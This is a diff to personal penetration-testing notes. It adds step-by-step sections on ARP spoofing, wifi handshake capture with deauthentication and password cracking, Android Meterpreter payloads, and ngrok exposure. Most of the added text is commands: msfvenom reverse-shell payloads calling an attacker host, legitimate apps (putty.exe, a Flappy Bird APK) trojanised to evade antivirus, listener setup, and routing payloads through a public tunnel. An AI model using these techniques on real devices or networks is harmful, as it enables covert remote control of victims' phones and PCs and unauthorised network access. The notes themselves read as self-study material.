@@ -397,7 +397,7 @@ Creating payloads can be done with the help of a tool called MSFVENOM
 |  -n - no operation prepended to the payload with a specific length
 |  
 |  now on comparing both these payloads in virustotal the one with advanced options is much less FUD(fully undetectable) by AVS(even though we create payloads with msfv and still be used by a vast majority payloads it creates are likely detectable nowadays)
-|  we can also use another option called templating(-x) i.e. taking a legitmate .exe file and creates a shell around it. Eg: using the software Putty for the follwing example:
+|  we can also use another option called templating(-x) i.e. taking a legitmate .exe file and creates a shell around it which is also known as masquerading. Eg: using the software Putty for the follwing example:
 |  > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -x putty.exe -o shell.exe (also when scanning this in virustotal it can bypass some reasonable amount of antiviruses)
 |  NOTE: for the above cmd while templating would end up in success as it might not work and it depends upon the template software that we'll use. so choose wise!
 |  
@@ -405,8 +405,7 @@ Creating payloads can be done with the help of a tool called MSFVENOM
 |  i.e. the extensions that needs software/compiler/interpreter might not be installed in the target's system.
 |  eg: python might be installed only in linux and mac but not on windows so on distribution there be no way of running the payload but rather install python in order to execute the payload
 
-FOR CREATING AND UPLOADING A PAYLOAD VIA WEBSITE(refer the foll. section in WEB APP PENETRATION TESTING): [VIDEO (Command Injection)] METASPLOITABLE 2.0 --> [EXTRA (MAKING USE OF MSFV & MSFC FOR WEB PAGE COMMAND INJECTION)]
-
+FOR CREATING AND UPLOADING A PAYLOAD THROUGH TARGET HOSTED WEBSITE(refer the foll. section in WEB APP PENETRATION TESTING): [VIDEO (Command Injection)] METASPLOITABLE 2.0 --> [EXTRA (MSFV & MSFC FOR WEB PAGE COMMAND INJECTION)]
 
 OTHER TOOLS LIKE MSFVENOM FOR PAYLOAD CREATION(the following tools present below should be ran with root access(> sudo su)):
 veil (apt-get install veil)
@@ -699,7 +698,7 @@ then goto command execution tab to start the execution
         3. Security Level - high:
                 this ain't vulnerable since the input validation is done in a way where the 4 octets of the ipv4 address provided are checked individually else if other strings are present it returns an error msg
 
-        [EXTRA (MAKING USE OF MSFV & MSFC FOR WEB PAGE COMMAND INJECTION)] (foll. talks about creating a python payload with msfv upload it in the vulnerable website by hosting the payload in a python server, set revshell with msfc and trigger the payload with the found vulnerability)
+        [EXTRA (MSFV & MSFC FOR WEB PAGE COMMAND INJECTION)] (foll. talks about creating a python payload with msfv upload it in the vulnerable website by hosting the payload in a python server, set revshell with msfc and trigger the payload with the found vulnerability)
         Now instead of using the nc revshell we did for executing the payload we can use msfc which provides us much more shell features
         so to create a meterpreter session first we need to create a payload with msfvenom.
         since we know that our target machine is a linux32(metasploitable2.0) we can create a python reverse_tcp payload, also the reason why we use python is that most linux systems has python preinstalled so we don't have to install any additional softwares to make our payload run. We create it as follows:
@@ -731,3 +730,130 @@ ____________________________________________________________________
 MAN IN THE MIDDLE
 ____________________________________________________________________
 
+ARP SPOOFING:
+in a network basically when requesting a page routers used to have routing tables and arp tables that helps retrieving the webpage and keeping track of who requested is done by the arp table(consists of arp requests(when a device wants a mac for given ip) and responses) by mapping the local ip to device's mac address, this is how routing works, but
+in man in the middle where u tend to be the router where victim after poisoning arp (this means the attacker literally messes up with the arp table saying that he's the router by sending arp responses to the victims connected to the network), they send you the request that need to be sent to the router but we are the router and so forward packets as if they were forwarded by the victim and router returns the result to the attacker
+
+[TODO: Bettercap]
+[TODO: Ettercap]
+[TODO: Scapy]
+
+____________________________________________________________________
+WIRELESS ACCESS POINT CRACKING
+____________________________________________________________________
+
+here <wireless_interface_name> denotes the wireless card's name in attacker's PC
+
+Switch wifi card to monitor mode:
+first check whether wifi card supports monitor mode and type the following command:
+> iwconfig (this shows whether wificard is running and at which mode)
+to switch first we need to switch off the card from being in managed mode and then change the mode to monitor then turn up the card as follows:
+> sudo ifconfig <wireless_interface_name> down
+> sudo iwconfig <wireless_interface_name> mode monitor
+> sudo ifconfig <wireless_interface_name> up
+now if we try '> ifconfig' we must get the mode of the wifi card as monitored
+sometimes we get disconnected from the internet and we get back to managed mode itself but redo the above steps to bring it back to monitor mode
+
+(airmon-ng) AIRMON-NG for Deauthenticating Devices from wireless AP(Access Point) and grabbing nonhashed/hashedpassword:
+NOTE: following monitoring process didn't show 5GHz router channels
+first set attacker's wifi card to monitor mode like we did in the previous section
+then using airmon-ng we can check whether what all services might cause trouble with our wifi cracking as follows:
+> airmon-ng check <wireless_interface_name>
+if case we get any process, to kill them:
+> airmon-ng check kill 
+after killing make sure whether we've gone again to the managed mode by using '> iwconfig' and if yes then rerun the previous section's commands 
+we can also set to monitor mode using airmon-ng as follows:
+> airmon-ng start <wireless_interface_name> (this adds a suffix to the <wireless_interface_name> as <wireless_interface_name>mon )
+now to start dumping all the wireless access points and their info:
+> airodump-ng <wireless_interface_name>|<wireless_interface_name>mon 
+from the dumped info there are some column definitions we need to know about:
+        ESSID - names of wireless access points
+        AUTH,CIPHER,ENC - type of protection the wireless AP has
+        CH - Wireless AP's Channel
+        DATA - tells whether the AP is active currently or in other words whether any connected devices are accessing the internet
+        PWR - how far the AP is (lower the no. closer the access point and viceversa [NOTE: if the AP is pretty far the attack might not work]) 
+now ctrl+c after collecting enough information of the AP you want to attack, make sure to remember the channel and the mac address
+now we need to start sniffing process specific to the bssid(AP) and write sniffed information such as the AP handshake etc as follows:
+> airodump-ng -c <AP's_channel> --bssid <MAC_address_of_AP> -w <sniffed_output_filename> <wireless_interface_name>|<wireless_interface_name>mon
+now we can see 2 different tables showing info about the AP (column 1) & the devices connected to it(column 2)
+we can now perform a Deauthentication attack to the AP so that all the users connected to the wifi will be disconnected and when we stop the deauth process, users try connecting again a handshake happens where the hash of the password is sent by the normal user to the AP
+at that time airodump-ng captures the handshake info which we need the most. so to do deauth:
+> aireplay-ng -0 0 -a <MAC_address_of_AP> <wireless_interface_name> (means send deauth packets indefinitely)
+deauth packets are sent until we ctrl+c the above cmd and nobody will be able to connect to the AP
+after capturing the handshake stop the dumping process and we can now use the capfile (<sniffed_output_filename>) to further our cracking process
+for that we can now use aircrack-ng to perform the cracking as follows:
+> aircrack-ng -w <dictionary_file>.txt <sniffed_output_filename>.cap
+for dictionary_file we already have a password dictonary present in kalilinux called rockyou.txt which is present in a zip file where we can extract(gzip -d rockyou.txt.gz) an use it('locate rockyou.txt' gives you the location) or
+we can use our own dictionary file i.e. a txt file with password 1/line
+in case we get the password it shows: ' KEY FOUND! [ <the_password_found> ] '
+Now due to the service kill(Network Manager) we performed at the start, your internet might not work
+so to make it work we need to start the NetworkManager service. to start it:
+> sudo service NetworkManager start 
+
+(hashcat) HASHCAT for cracking password /w adv. feats:
+hashcat --help for all possible features that can be used
+In our case the type of password hash we want to crack is WPA-EAPOL-PBKDF2 having a code 2500 which can be found out from the hashcat help menu
+-m type of password hash we want to crack (the option's value is the code we mentioned above)
+-a option is the attack mode that we can customize the CPU power consumption (lower-0, higher-3)
+NOTE: hashcat doesn't support .cap file we need to convert it to .hccapx (use this link for online conversion: https://www.onlinehashcrack.com/tools-cap-to-hccapx-converter.php)
+so to execute:
+> hashcat -a 0 -m 2500 <hccapx_file>.hccapx <dictionary_file>.txt
+now during the runtime it doesn't show any type of progress bar rather it shows status, pause, bypass, checkpoint, quit options with first character of each word as action
+from which we can check intermediate info about the ongoing cracking process
+after finding the password it displays the <hash>:<AP's_name>:<password_in_plain_text>
+
+EXTRAS: https://github.com/FluxionNetwork/fluxion 
+
+
+____________________________________________________________________
+ANDROID HACKING
+____________________________________________________________________
+
+Creating a meterpreter session in target android phone:
+> msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -o <filename>.apk
+now to listen to the target in msfc:
+> use exploit/multi/handler
+> set payload android/meterpreter/reverse_tcp
+set LHOST and LPORT
+> run
+
+EvilDroid(quick and dirty way of creating payload and cleaning stuffs from target's android phone) - https://github.com/M4sc3r4n0/Evil-Droid
+extract and install it in kalinux
+we'll create a regular payload as follows:
+Select>: 1 (APK MSF)
+a popup to set attacker's ip, attacker's port, apk filename payload type
+then ok, now it gives an option whether to start the multi-handler(similar to the one we start a listener in msfc) so we'll select it
+and output'll be present in the relative evildroid folder
+now after the attack and misc been done with the payload we can close the session and also all respective services will be closed that start when we ran the evildroid application
+
+Masquerading legit apk with msfvenom(try the following with a root account):
+for this we've downloaded flappybird1.3.apk file from the internet
+> msfvenom -x <downloaded_apk_file>.apk -p android/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_listening_port> -o <output_file_name>.apk
+if the above didn't go well follow the github repo to install apktool: https://ibotpeaches.github.io/Apktool/install/
+send the above apk to the target android phone with a python server or apache2
+
+
+[FOLLOWING METHOD DID'T WORK DUE TO UNKNOWN ISSUES]
+____________________________________________________________________
+NGROK FOR CREATING A PUBLIC URL
+____________________________________________________________________
+download link: https://ngrok.com/download
+ngrok is a utility that allows port forwarding from ngrok public servers to our local server
+NOTE: free version of ngrok the port number changes everytime we close and run the application
+to execute use the cmd as follows:
+> ./ngrok tcp <port_number>
+on executing this we see that we get a forwarding message section with the domain&hostname:port (here assume the port as <ngrok_port) of the online ngrok server port forwarding to our localport
+now we can use this to host our payloads online and to create them is as follows:
+but first we need to resolve the dns for the given domain&hostname i.e. if the assigned domain&hostname is 4.ngrok.io and port 12345 from the forwarding message section we can use a cmd as follows:
+> host <assigned_domain&hostname_by_ngrok> (returns the public ip address of the ngrok server) 
+now consider the above ip address output as <ngrok_aip>
+> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ngrok_aip> LPORT=<ngrok_port> -f exe -o shell.exe (for winx64) 
+> msfvenom -p android/meterpreter/reverse_tcp LHOST=<ngrok_aip> LPORT=<ngrok_port> -f apk -o shell.apk (for android) 
+now we need to setup a local listener where the ngrok server port forwards the request to our router's public ip and then to our msfc
+> msfconsole
+> use exploit/multi/handler
+> set payload windows/x64/meterpreter/reverse_tcp (for windows)
+> set payload android/meterpreter/reverse_tcp (for android)
+> set LHOST 0.0.0.0 (0.0.0.0 means listen on any interface whatsoever)
+> set LPORT 5555
+> run
